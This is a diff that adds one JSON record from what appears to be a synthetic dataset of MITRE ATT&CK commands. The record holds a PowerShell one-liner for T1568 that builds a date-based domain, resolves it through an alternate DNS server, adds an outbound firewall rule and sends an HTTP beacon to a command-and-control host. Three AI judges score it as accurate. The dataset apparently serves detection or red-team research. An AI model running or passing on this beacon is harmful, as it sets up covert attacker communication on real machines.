@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ScriptBlock { $dom=('ns{0}.hopdns.org' -f ((Get-Date).ToString('ddHH'))); ipconfig /flushdns | Out-Null; $a=Resolve-DnsName $dom -Type A -DnsOnly -NoHostsFile -Server '1.0.0.1' -ErrorAction SilentlyContinue; if($a){ $port=@(8081,8444,9001) | Get-Random; netsh advfirewall firewall add rule name=('out_'+$port) dir=out action=allow protocol=TCP remoteport=$port | Out-Null; Invoke-WebRequest -Uri ('http://{0}:{1}/b' -f $dom,$port) -Headers @{ Host=$dom } -TimeoutSec (Get-Random -Min 4 -Max 9) -UseBasicParsing } }",
+  "explanation": "Flushes caches and performs DNS-only resolution via an alternate resolver, randomizes the egress port from a small set of uncommon ports, and initiates a benign-looking HTTP request.",
+  "rationale_steps": [
+    "Avoid cached or hosts-file-influenced answers by forcing DNS-only resolution.",
+    "Resolve a DGA domain using a non-default resolver.",
+    "Allow outbound connectivity on a randomly chosen uncommon port.",
+    "Send a check-in using Host header routing and randomized timeout."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-5b98f3ee-e59a5512",
+  "source_prompt_hash": "5b98f3ee",
+  "timestamp_utc": "2025-09-30T09:58:10.642945Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, parentheses, and braces, proper PowerShell syntax throughout, and valid parameter usage for all cmdlets.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements T1568 (Dynamic Resolution) by algorithmically generating domain names based on date/time, using DNS resolution to establish command and control, and implementing randomized ports for communication.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T06:59:12.090455Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, parentheses, braces, correct command separators, and valid flag formats for PowerShell cmdlets.",
+        "semantic_score": 4,
+        "semantic_justification": "The command effectively implements dynamic resolution via DGA, alternate DNS server, and beaconing, but the `netsh advfirewall` command requires Administrator privileges, contradicting the stated 'Privilege: None'.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T06:59:25.012884Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell scriptblock is well-formed with balanced delimiters and valid cmdlets/parameters; operators and pipelines are correctly used.",
+        "semantic_score": 4,
+        "semantic_justification": "Implements time-based domain generation with DNS-only resolution via an alternate resolver and performs an HTTP beacon on randomized ports, aligning with T1568, though adding a firewall rule likely requires admin privileges contrary to the stated none.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T06:59:55.065083Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
